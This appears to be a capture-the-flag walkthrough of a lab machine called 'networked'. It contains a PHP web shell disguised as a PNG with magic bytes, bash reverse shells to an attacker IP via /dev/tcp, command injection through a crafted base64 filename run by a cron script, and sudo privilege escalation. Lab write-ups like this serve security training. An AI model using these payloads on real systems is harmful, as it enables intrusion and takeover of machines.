
Running nmap

```
nmap -sV 10.129.113.34
```

The webpage is just a quick paragraph that a website will be up soon.

I run gobuster against this apache website to discover any php files:

```
$ gobuster dir -u http://10.129.113.34/ -w sirectory-list-2.3-medium.txt -t 100 -x php

/index.php
/uploads
/upload.php
/backup
```

The `/backup` folder contains a tar archive, I download it:

```
wget http://10.129.113.34/backup/backup.tar
```

It contains the source for the php files. In the file I see the function `@mime_content_type($file['tmp_name']);`. This function in php determines a filetype based on its magic bytes. If we include the magic bytes for the file in the header of the file, we can bypass the filter.

Important to mention that the upload functionality only allows png file upload, but the extention `.php.png`, allows us to evade this while executing a php file. I create a file called `shell.php.png` with the following contents:

```
<?php
system($_REQUEST['cmd']);
?>
```

I create a new file with the magic bytes:

```
echo '89 50 4E 47 )D 0A 1A 0A' | xxd -p -r > mime_shell.php.png
cat shell.php.png >> mime_shell.php.png
```

I upload the file `mime_shell.php.png`, then visit the webpage "10.129.113.34/photos.php", and see the new image uploaded is called "uploaded_by_10_10_14_207.php.png" I visit the page "10.129.113.34/uploads/uploaded_by_10_10_14_207.php.png?cmd=id", when I visit the page I get the shell output of `id`. Following this logic I should be able to run a reverse shell.

Before running the reverse shell I set up a listener locally:

```
$ nc -lvp 1234
```

From my local I run:

```
curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.207/1234 0>&1"' http://10.129.113.34/uploads/10_10_14_207.php.png
```

The above command is a `curl` to the url "http://10.129.113.34/uploads/10_10_14_207.php.png", with the payload `cmd=bash -c "bash -i >& /dev/tcp/10.10.14.207/1234 0>&1"`.

This gets me shell access to the victim ip.

#### Lateral Movement

From examining the crontab file, we see that the check_attack.php script is executed every 3 minutes.

The script lists files in the /uploads folder and checks if it is valid based on filename. Any invalid files are removed using the system exec() function.

```

 exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```
The $value variable stores the filename, but isn’t sanitized by the script, which means that we can inject commands through special file names. For example, a file named “; cmd” will result in the command:
```

 nohup /bin/rm -f $path;cmd > /dev/null 2>&1 &
 ```

I run these commands on the victim ip:

```
bash-4.2$ echo -n 'bash -c "bash -i >/dev/tcp/10.10.14.207/4444 0>&1"' | base64
YmFzaCAtYyAiYmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTQuMjA3LzQ0NDQgMD4mMSI=

bash-4.2$ touch -- ';echo YmFzaCAtYyAiYmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTQuMjA3LzQ0NDQgMD4mMSI= | base64 -d | bash'

bash-4.2$ ls
ls
10_10_14_207.php.png
127_0_0_1.png
127_0_0_2.png
127_0_0_3.png
127_0_0_4.png
;echo YmFzaCAtYyAiYmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTQuMjA3LzQ0NDQgMD4mMSI= | base64 -d | bash
index.html
```

To describe what is going on in the above commands, the reverse shell is encoded in `base64`, `bash -i >/dev/tcp/10.10.14.207/4444 0>&1`. Then `touch` creates a filename with the command we want, `base64 -d` decodes the code encoded earlier, then `bash` executes the command.

After a few minutes, I get the shell on the listening port `4444`, I get access to the user `guly` and navigate to the user flag:

```
$ nc -lvp 4444
listening on [any] 4444 ...
10.129.113.34: inverse host lookup failed: Unknown host
connect to [10.10.14.207] from (UNKNOWN) [10.129.113.34] 47338
id
uid=1000(guly) gid=1000(guly) groups=1000(guly)
ls
check_attack.php
crontab.guly
dead.letter
user.txt
cat user.txt
3f716e7098ec9031e6826724bc9aa35e
```

Running `sudo -l`:

```
sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

I execute that file and get root access and the root flag:

```
sudo /usr/local/sbin/changename.sh
interface NAME:
abc /bin/bash
interface PROXY_METHOD:
abc
interface BROWSER_ONLY:
abc
interface BOOTPROTO:
abc
id
uid=0(root) gid=0(root) groups=0(root)
...
cat /root/root.txt
f4dfc57131aa3a44b9b1f2592800d919
```